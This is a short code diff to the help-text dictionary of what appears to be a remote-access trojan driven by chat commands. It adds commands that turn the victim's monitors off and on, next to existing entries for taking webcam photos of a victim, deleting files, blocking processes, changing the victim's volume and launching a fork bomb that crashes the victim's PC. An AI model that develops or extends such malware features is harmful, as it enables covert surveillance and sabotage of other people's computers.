@@ -401,6 +401,8 @@ help = {
         'remove': ['➡️ `.remove <file-or-directory-name>`', 'Removes the specified file or directory. Options:\n🔹file-or-directory-name - name of file or directory that you want to remove'],
         'blacklist': ['➡️ `.blacklist <process-name>`', 'Adds the specified process to the blacklist.'],
         'whitelist': ['➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
+        'turnoff': ['➡️ `.turnoff`', 'Turns all monitors off'],
+        'turnon': ['➡️ `.turnon`', 'Turns all monitors on'],
         'webcam': ['➡️ `.webcam photo`', 'Takes a photo of a victim\'s webcam (if one is detected)'],
         'forkbomb': ['➡️ `.forkbomb`', 'Creates a self-replicating process until the victim\'s PC crashes.'],
         'volume': ['➡️ `.volume`', 'Change the speaker volume on the victim\'s PC.'],
